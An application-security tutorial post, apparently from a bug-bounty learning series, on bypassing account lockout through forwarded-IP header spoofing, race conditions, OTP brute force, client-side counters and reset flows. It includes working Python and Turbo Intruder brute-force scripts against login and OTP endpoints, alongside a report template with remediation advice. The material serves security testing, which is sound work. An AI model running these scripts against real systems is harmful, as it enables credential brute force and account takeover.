# Account Lockout Bypass

> **Severity:** CRITICAL
> **OWASP:** A07 – Identification & Authentication Failures
> **CWE:** CWE-307 / CWE-840 – Authentication Bypass
> **Bug Bounty Payouts:** $500 – $10,000+

---

## What Is It?

The application has a lockout. But the lockout has a hole.

Account lockout bypass means the security control *exists* but can be *circumvented* — making it effectively useless. This is often rated **higher** than having no lockout at all, because the developer thought they were protected and didn't add other defenses.

**Analogy:** A vault has a 3-attempt lockout... but the counter resets if you knock on the door first. The lockout is theater. You have unlimited attempts.

---

## Why It's Critical

When you find a lockout bypass, you've just unlocked brute force on a protected endpoint. Combined with Day 19's brute force techniques — this is a direct path to account takeover at scale. Programs consistently triage this at Critical.

---

## Bypass Technique 1 — IP Header Spoofing

Most lockout implementations track by IP address. But many apps trust forwarded-IP headers from the client — which are completely attacker-controlled.

**Headers to try:**

```
X-Forwarded-For: 1.1.1.1
X-Real-IP: 1.1.1.1
True-Client-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
CF-Connecting-IP: 1.1.1.1
X-Client-IP: 1.1.1.1
Forwarded: for=1.1.1.1
```

**Burp Match & Replace rule:**

In Burp → Proxy → Match and Replace:
- Match: `^X-Forwarded-For:.*`
- Replace: `X-Forwarded-For: §ROTATE§`

Or use Burp Intruder with a number list (1 to 255) and rotate:

```http
POST /login HTTP/1.1
Host: target.com
X-Forwarded-For: 10.0.0.§1§

{"username":"admin","password":"§password§"}
```

**Python automation:**

```python
import requests

url = "https://target.com/api/login"
password_list = open("/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt").readlines()

for i, pwd in enumerate(password_list):
    headers = {
        "X-Forwarded-For": f"10.0.{i//255}.{i%255}",
        "X-Real-IP":        f"10.0.{i//255}.{i%255}",
        "Content-Type":    "application/json"
    }
    r = requests.post(url,
        json={"username": "admin", "password": pwd.strip()},
        headers=headers, timeout=5)

    if r.status_code == 200 and "token" in r.text:
        print(f"[HIT] Password: {pwd.strip()}")
        break

    print(f"[{i+1}] {r.status_code} | IP: {headers['X-Forwarded-For']}")
```

---

## Bypass Technique 2 — Race Condition

Lockout logic typically works like this:
1. Receive request
2. Check fail counter → if > limit, block
3. Validate credentials
4. Increment fail counter

If you send 50 requests *simultaneously*, steps 1-2 execute for all requests before step 4 can increment the counter for any. You race through the lockout window.

**Turbo Intruder script:**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,     # fire 50 at once
        requestsPerConnection=1,
        pipeline=False
    )
    passwords = [
        "password", "123456", "admin", "password1", "qwerty",
        "letmein", "welcome", "monkey", "dragon", "master",
        # ... load from file
    ]
    for pwd in passwords:
        engine.queue(target.req, pwd)

def handleResponse(req, interesting):
    if req.status == 200 or "token" in req.response:
        table.add(req)
```

**Request template:**
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "admin", "password": "%s"}
```

The single-packet HTTP/2 attack (send all in one TCP packet) makes this even more reliable — all requests arrive at the server simultaneously, overwhelming the counter before it can lock.

---

## Bypass Technique 3 — OTP Lockout Bypass

Password reset and 2FA OTP endpoints often have *separate* (and weaker) lockout logic than the main login. This is a goldmine.

**Test methodology:**

```python
import requests

url = "https://target.com/api/verify-otp"

# Test: how many attempts before lockout?
for i in range(100):
    r = requests.post(url,
        json={"email": "victim@target.com", "otp": str(i).zfill(6)},
        cookies={"session": "YOUR_SESSION"})

    print(f"[{i}] Status: {r.status_code}")
    if "locked" in r.text.lower() or r.status_code == 429:
        print(f"Lockout triggered at attempt {i}")
        break
else:
    print("No lockout found — 6-digit OTP = 1M combos = trivially brute-forceable")
```

**Why it matters:** A 6-digit OTP with no lockout has 1,000,000 combinations. At 10 requests/second that's 27 hours. At 100/second = 2.7 hours. At 1000/second (common for unprotected APIs) = 16 minutes.

---

## Bypass Technique 4 — Client-Side Lockout Counter

Some developers store the fail counter in a cookie or local storage. This is bypassed by simply deleting or resetting the cookie.

```
# Check response headers after failed login
Set-Cookie: failCount=3; Path=/

# Bypass: delete cookie or set failCount=0 before next attempt
POST /login
Cookie: failCount=0
```

Also look for lockout state in JWT tokens — decode the JWT payload and check for fields like `lockoutUntil`, `failedAttempts`, `isLocked`.

---

## Bypass Technique 5 — Password Reset Clears Lockout

Many apps reset the lockout counter when a password reset is initiated or completed — even without actually changing the password in some cases.

**Test:**
1. Trigger lockout on account `victim@target.com`
2. Hit `POST /forgot-password {"email":"victim@target.com"}`
3. Try logging in again — is the counter reset?

If yes → infinite attempts via reset-and-retry loop.

---

## Full PoC Flow (Header Spoofing)

```
1. POST /login {"u":"admin","p":"wrong1"}  → 401  [X-FF: 1.1.1.1]
2. POST /login {"u":"admin","p":"wrong2"}  → 401  [X-FF: 1.1.1.2]
3. POST /login {"u":"admin","p":"wrong3"}  → 401  [X-FF: 1.1.1.3]
   (without bypass: would be locked here)
4. POST /login {"u":"admin","p":"wrong4"}  → 401  [X-FF: 1.1.1.4]
...
500. POST /login {"u":"admin","p":"admin123"} → 200 {"token":"..."}

Lockout bypass confirmed. Full brute force = valid.
```

---

## Severity Rating

| Bypass Method Found | Severity |
|---|---|
| Header spoofing bypasses lockout | **Critical** |
| Race condition bypasses lockout | **Critical** |
| OTP lockout bypassable (< 10 attempts) | **Critical** |
| Client-side lockout counter | **High** |
| Reset flow clears lockout | **High** |
| Lockout is soft (delays only, not blocks) | **Medium** |

---

## Bug Report Template

```
Title: Account Lockout Bypass via X-Forwarded-For Header Manipulation

Severity: Critical

Summary:
The login endpoint at /api/auth/login implements account lockout
after 5 failed attempts, but the lockout counter is tracked per
IP address using the X-Forwarded-For header, which is attacker-
controlled. By rotating this header value per request, an attacker
can bypass the lockout entirely and perform unlimited brute force.

Steps to Reproduce:
1. Attempt login 5 times to trigger lockout for user "admin"
   Confirm: 6th attempt returns 423 Locked

2. Add header: X-Forwarded-For: 1.2.3.4
   7th attempt: 401 Invalid credentials (lockout bypassed)

3. Continue rotating X-Forwarded-For per request.
   1000+ attempts sent — no lockout triggered.

4. Using top 1000 passwords: "admin123" succeeded at attempt 412.

Impact:
Lockout mechanism is fully neutralised. Attacker can brute force
any account with no practical restriction, leading to full account
takeover for any user with a weak or reused password.

Remediation:
- Track lockout by username, not IP address
- Never trust X-Forwarded-For for security decisions
- Use server-side session-bound counters only
- Add CAPTCHA + MFA as additional layers

CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — Score: 9.1 (Critical)
```

---

## Key Takeaway

**A broken lockout is worse than no lockout.** It gives developers false confidence and users zero protection.

When you find a lockout — don't stop there. Always try header spoofing, race conditions, and the OTP endpoint. One of these almost always works. The bypass turns a Medium into a Critical.

Hunt the bypass, not just the absence.

---

*#300DaysWithAppSec | Day 19 | Account Lockout Bypass*

---

**Connect:**
- LinkedIn: [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369)
- GitHub: [github.com/anand87794](https://github.com/anand87794)
- Portfolio: [anandprajapati.lovable.app](https://anandprajapati.lovable.app)
- X: [@anand87794](https://x.com/anand87794)

@anand87794
